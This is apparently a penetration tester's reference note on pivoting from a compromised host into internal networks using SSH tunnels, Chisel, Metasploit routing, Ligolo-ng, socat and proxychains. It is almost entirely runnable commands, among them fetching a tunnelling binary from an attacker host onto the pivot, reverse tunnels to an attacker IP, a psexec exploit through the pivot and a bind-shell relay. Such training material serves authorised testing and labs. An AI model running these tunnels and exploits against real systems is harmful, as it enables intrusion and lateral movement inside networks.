# Pivoting Techniques

## Table of Contents
- [[#Introduction|Introduction]]
- [[#SSH Tunneling|SSH Tunneling]]
- [[#Chisel|Chisel]]
- [[#Metasploit Routing|Metasploit Routing]]
- [[#Ligolo-ng|Ligolo-ng]]
- [[#Socat Relaying|Socat Relaying]]
- [[#Proxychains|Proxychains]]
- [[#FoxyProxy (Browser)|FoxyProxy (Browser)]]
- [[#Port Forwarding Decision Tree|Port Forwarding Decision Tree]]
- [[#Related Notes|Related Notes]]

---

## Introduction

Pivoting lets you use a compromised host as a gateway to reach internal networks that your attack machine cannot directly access.

### Network Topology

```text
[Kali] ── (Internet/External) ── [Compromised Host] ── (Internal) ── [Targets]
  10.10.14.3                       10.10.14.10               172.16.1.0/24
                                   172.16.1.10
```

### Key Terms

| Term | Description |
|------|-------------|
| **Pivot Host** | Compromised machine used as a gateway |
| **Internal/Subnet** | Network reachable only through the pivot |
| **Tunnel** | Encapsulated connection through the pivot |
| **Socks Proxy** | Generic proxy protocol for TCP traffic |
| **Port Forward** | Direct mapping of one port to another |

---

## SSH Tunneling

SSH tunneling provides encrypted tunnels through SSH connections. Requires SSH server on the pivot host.

### Local Port Forwarding (`-L`)

Forwards a port on YOUR machine through the pivot to reach an internal target.

```bash
# Syntax: ssh -L <local_port>:<target_host>:<target_port> user@pivot_host
ssh -L 8080:web.internal.com:80 user@pivot_host

# Specific local bind address
ssh -L 127.0.0.1:8080:172.16.1.50:80 user@pivot_host

# Multiple forwards
ssh -L 8080:172.16.1.50:80 -L 3389:172.16.1.60:3389 user@pivot_host

# Non-interactive (no shell)
ssh -L 8443:172.16.1.100:443 -N -f user@pivot_host
```

**Flags:**
| Flag | Description |
|------|-------------|
| `-L` | Local port forward |
| `-N` | Don't execute remote command (no shell) |
| `-f` | Background mode |
| `-C` | Compression |
| `-v` | Verbose |
| `-4` | IPv4 only |

**Use case:** Access internal web app or RDP through pivot.

```bash
# Access internal web server
ssh -L 8080:172.16.1.100:80 -N -f user@10.10.14.10
# Then browse to http://localhost:8080

# Access internal RDP
ssh -L 13389:172.16.1.110:3389 -N -f user@10.10.14.10
# Then rdesktop 127.0.0.1:13389
```

### Remote Port Forwarding (`-R`)

Forwards a port from YOUR machine to the target (reverse tunnel). Useful when the pivot can connect to you, but you can't connect to the pivot.

```bash
# On pivot host (from reverse shell or command execution)
ssh -R <attacker_port>:<target_host>:<target_port> user@attacker_ip

# Forward target's internal server back to attacker
ssh -R 8080:172.16.1.50:80 user@10.10.14.3 -N -f
# Now attacker can access 172.16.1.50:80 via localhost:8080
```

**Use case:** Pivot can connect outbound but you can't connect inbound.

```bash
# From the compromised host with SSH access
ssh -R 8888:localhost:80 user@10.10.14.3 -N -f
# Attacker accesses http://localhost:8888 to see the pivot's local web service

# Expose internal service on attacker's machine
ssh -R 33060:172.16.1.200:3306 user@10.10.14.3 -N -f
# Attacker accesses MySQL via localhost:33060
```

### Dynamic Port Forwarding (`-D` + Socks Proxy + Proxychains)

Creates a SOCKS proxy on your machine that routes all traffic through the pivot.

```bash
# Start SOCKS proxy on port 1080
ssh -D 1080 user@pivot_host -N -f

# With compression
ssh -D 1080 -C -N -f user@pivot_host

# Bind to specific interface
ssh -D 127.0.0.1:1080 user@pivot_host -N -f
```

**Configure proxychains:**

```bash
# /etc/proxychains.conf
[ProxyList]
socks4 127.0.0.1 1080
```

**Use with proxychains:**

```bash
# Any TCP tool can be proxied
proxychains nmap -sT -Pn -p 80 172.16.1.0/24
proxychains smbclient -L //172.16.1.100
proxychains crackmapexec smb 172.16.1.100 -u user -p pass
proxychains xfreerdp /v:172.16.1.110 /u:admin
proxychains firefox  # Browse internal sites
```

---

## Chisel

Chisel creates HTTP tunnels over a single TCP connection. It's smaller than SSH and doesn't require SSH server.

### Setup

```bash
# Download chisel on attacker
curl -L https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz -o chisel.gz
gunzip chisel.gz

# Also get Windows version
curl -L https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz -o chisel_windows.gz
```

### Chisel Server (Attacker)

```bash
# Basic server
./chisel server --reverse --port 8000

# With authentication
./chisel server --reverse --port 8000 --auth "user:password"
```

### Chisel Client (Pivot — Socks Proxy)

```bash
# On pivot — connect back to attacker and expose a SOCKS proxy
./chisel client <attacker_ip>:8000 R:socks

# Example:
./chisel client 10.10.14.3:8000 R:1080:socks
# This exposes a SOCKS proxy on the attacker at 127.0.0.1:1080
```

### Chisel Client (Pivot — Port Forward)

```bash
# Forward internal port to attacker
./chisel client 10.10.14.3:8000 R:<local_port>:<internal_host>:<internal_port>

# Example: Forward internal web server
./chisel client 10.10.14.3:8000 R:8080:172.16.1.100:80

# Example: Forward internal RDP
./chisel client 10.10.14.3:8000 R:13389:172.16.1.110:3389

# Multiple forwards
./chisel client 10.10.14.3:8000 R:8080:172.16.1.100:80 R:13389:172.16.1.110:3389
```

### Full Chisel Socks Proxy Setup

```text
Step 1 (Attacker):   ./chisel server --reverse --port 8000
Step 2 (Pivot):      ./chisel client 10.10.14.3:8000 R:1080:socks
Step 3 (Attacker):   Configure proxychains to use socks5 127.0.0.1 1080
Step 4 (Attacker):   proxychains <any tool> <internal IP>
```

### Chisel over Existing Reverse Shell

If you have a reverse shell but no direct SSH, upload chisel to the pivot:

```bash
# Upload chisel to pivot (via wget/curl)
wget http://10.10.14.3:8000/chisel -O /tmp/chisel
chmod +x /tmp/chisel

# Start SOCKS proxy
/tmp/chisel client 10.10.14.3:8000 R:1080:socks
```

---

## Metasploit Routing

### Add Internal Network Route

```bash
# From msfconsole, after getting a session
# meterpreter session
route add 172.16.1.0/24 <session_id>

# Or from msfconsole
route add 172.16.1.0/24 255.255.255.0 <session_id>

# List routes
route print

# Remove route
route del 172.16.1.0/24 <session_id>

# Flush all routes
route flush
```

### Using Background Jobs

```bash
# Auto-route module
use post/multi/manage/autoroute
set SESSION <session_id>
set SUBNET 172.16.1.0
run
```

### Scan Through Pivot

```bash
# Portscan through route
use auxiliary/scanner/portscan/tcp
set RHOSTS 172.16.1.0/24
set PORTS 80,443,445,3389
run
```

### Exploit Through Pivot

```bash
# Any module will route through the session
use exploit/windows/smb/psexec
set RHOSTS 172.16.1.100
set SMBUser Administrator
set SMBPass password
run
```

### Metasploit Socks Proxy

```bash
# Start a SOCKS proxy through msf
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j

# Now use proxychains with any tool
# /etc/proxychains.conf → socks5 127.0.0.1 1080
```

---

## Ligolo-ng

Ligolo-ng creates a Layer 2 tunnel, registering the internal network as a new interface on your attack machine.

### Setup

```bash
# On attacker — download and build
git clone https://github.com/nicocha30/ligolo-ng
cd ligolo-ng
go build -o ligolo-agent cmd/agent/main.go
go build -o ligolo-proxy cmd/proxy/main.go
```

### Step 1: Start Proxy (Attacker)

```bash
# Create TUN interface
sudo ip tuntap add dev ligolo mode tun
sudo ip link set up dev ligolo

# Start proxy
./ligolo-proxy -selfcert -laddr 0.0.0.0:443
```

### Step 2: Run Agent (Pivot)

```bash
# From the compromised host
./ligolo-agent -connect 10.10.14.3:443 -ignore-cert

# On Windows
ligolo-agent.exe -connect 10.10.14.3:443 -ignore-cert
```

### Step 3: Add Routes

In the ligolo-proxy console:
```
ligolo-ng >> session
Agent joined. Name: agent1
ligolo-ng » session 1
[Agent : agent1] » info
[Agent : agent1] » ifconfig
[Agent : agent1] » listener_add --addr 0.0.0.0:13389 --to 127.0.0.1:3389
```

```bash
# Add route to internal network (on attacker)
sudo ip route add 172.16.1.0/24 dev ligolo

# Now access internal hosts directly
nmap 172.16.1.100 -p 80,443
smbclient -L //172.16.1.100
```

### Ligolo-ng Port Forwarding

```bash
# In agent session
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80

# Now anyone connecting to attacker:8080 gets forwarded through the tunnel to pivot:80
```

---

## Socat Relaying

Socat creates bidirectional relay channels. Useful for forwarding ports when SSH/Chisel isn't an option.

### Port Forward (Listener → Target)

```bash
# Forward port 4444 → 172.16.1.100:80
socat TCP-LISTEN:4444,fork,reuseaddr TCP:172.16.1.100:80

# With timeout
socat TCP-LISTEN:4444,fork,reuseaddr,su=nobody TCP:172.16.1.100:80,connect-timeout=10
```

### Full Relay (Pivot Host)

```bash
# On pivot: forward attacker's connection to internal target
socat TCP-LISTEN:4455,fork,reuseaddr TCP:172.16.1.100:445
# Then from attacker: smbclient -L //pivot_ip:4455
```

### Reverse Relay

```bash
# On pivot: forward internal target service back to attacker
socat TCP:attacker_ip:4444 TCP:172.16.1.100:80
```

### SSL Relay

```bash
# Encrypted relay
socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork,reuseaddr TCP:172.16.1.100:80
```

### Bind Shell Relay

```bash
# Relay a bind shell from an internal host
# On pivot
socat TCP-LISTEN:1337,fork TCP:172.16.1.200:4444

# Then attacker connects to pivot:1337
nc -nv pivot_host 1337
```

---

## Proxychains

Forces any TCP tool through a SOCKS proxy.

### Configuration

```bash
# /etc/proxychains.conf
strict_chain
proxy_dns  # DNS through proxy (may break)
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks4 127.0.0.1 1080
# socks5 127.0.0.1 1080  # If using SOCKS5
```

### Chaining Multiple Proxies

```bash
# /etc/proxychains.conf
[ProxyList]
socks4 10.10.14.3 1080
socks4 172.16.1.10 1080
```

### Usage

```bash
# Nmap (TCP only, no SYN scan)
proxychains nmap -sT -Pn -p 80,445 172.16.1.100

# CrackMapExec
proxychains crackmapexec smb 172.16.1.100 -u admin -p pass

# SMB client
proxychains smbclient -L //172.16.1.100

# RDP
proxychains xfreerdp /v:172.16.1.110 /u:admin

# MSSQL
proxychains mssqlclient.py domain.local/admin:pass@172.16.1.120

# Metasploit
proxychains msfconsole
```

### Proxychains with Nmap

```bash
# ALWAYS use -sT (TCP Connect) — no SYN scan through proxy
# Use -Pn (skip host discovery)
proxychains nmap -sT -Pn -p 80,443,445,3389 172.16.1.100
proxychains nmap -sT -Pn -p- 172.16.1.100  # Full port scan (slow)
```

> [!warning]
> Proxychains is not compatible with:
> - UDP scanning (`-sU`)
> - SYN scanning (`-sS`)
> - OS detection (`-O`)
> - Some raw socket tools

---

## FoxyProxy (Browser)

For browsing internal web apps through a SOCKS proxy.

### Setup

1. Install **FoxyProxy** browser extension (Chrome/Firefox)
2. Add a new proxy:
   - Proxy Type: SOCKS5 (or SOCKS4)
   - IP: `127.0.0.1`
   - Port: `1080` (or whatever your proxy uses)
3. Toggle proxy on/off with the extension icon
4. Browse internal web apps: `http://172.16.1.100/dashboard`

---

## Port Forwarding Decision Tree

```text
Need to access internal network?
│
├─ Pivot has SSH server?
│  ├─ Single port → SSH -L (Local Forward)
│  ├─ Multiple ports → SSH -L multiples or SSH -D + Proxychains
│  └─ Reverse tunnel → SSH -R (Remote Forward)
│
├─ Pivot has no SSH but can run binaries?
│  ├─ SOCKS proxy → Chisel (R:socks) + Proxychains
│  ├─ Single port → Chisel R:port:host:port
│  └─ Layer 2 → Ligolo-ng agent
│
├─ Only have Metasploit session?
│  ├─ Route add → MSF routing + socks_proxy
│  └─ Autoroute module
│
├─ Only have basic binary execution?
│  ├─ Forward port → socat relay
│  └── Bind shell → socat relay
│
└─ No direct connection (pivot connects out only)?
   ├─ SSH -R (if SSH)
   ├─ Chisel client (if can run binary)
   └─ Socat relay (if no SSH)
```

---

## Quick Reference

### SSH Tunneling Cheatsheet

```bash
# Local (forward port to internal host)
ssh -L <local_port>:<internal_ip>:<internal_port> user@pivot -N -f

# Remote (expose internal on attacker)
ssh -R <attacker_port>:<internal_ip>:<internal_port> user@attacker -N -f

# Dynamic (SOCKS proxy)
ssh -D 1080 user@pivot -N -f
```

### Chisel Cheatsheet

```bash
# Attacker
chisel server --reverse --port 8000

# Pivot (SOCKS)
chisel client ATTACKER_IP:8000 R:1080:socks

# Pivot (port forward)
chisel client ATTACKER_IP:8000 R:8080:INTERNAL_IP:80
```

### Proxychains Cheatsheet

```bash
# Configure /etc/proxychains.conf, then:
proxychains <tool> <args>

# Nmap (TCP only)
proxychains nmap -sT -Pn -p 80,445 INTERNAL_IP

# CrackMapExec
proxychains crackmapexec smb INTERNAL_IP -u user -p pass
```

### Metasploit Routing Cheatsheet

```
# In msfconsole
route add 172.16.1.0/24 255.255.255.0 1
use auxiliary/server/socks_proxy
run -j
```

---

## Related Notes

- [[06 - Shells and Payloads/6.1 Reverse Shells/Reverse Shell Compendium]]
- [[06 - Shells and Payloads/6.5 File Transfers/File Transfer Techniques]]
- [[07 - Metasploit Framework/Metasploit Complete]]
- [[05 - Network Attacks/5.2 Firewall Evasion/Firewall IDS Evasion]]
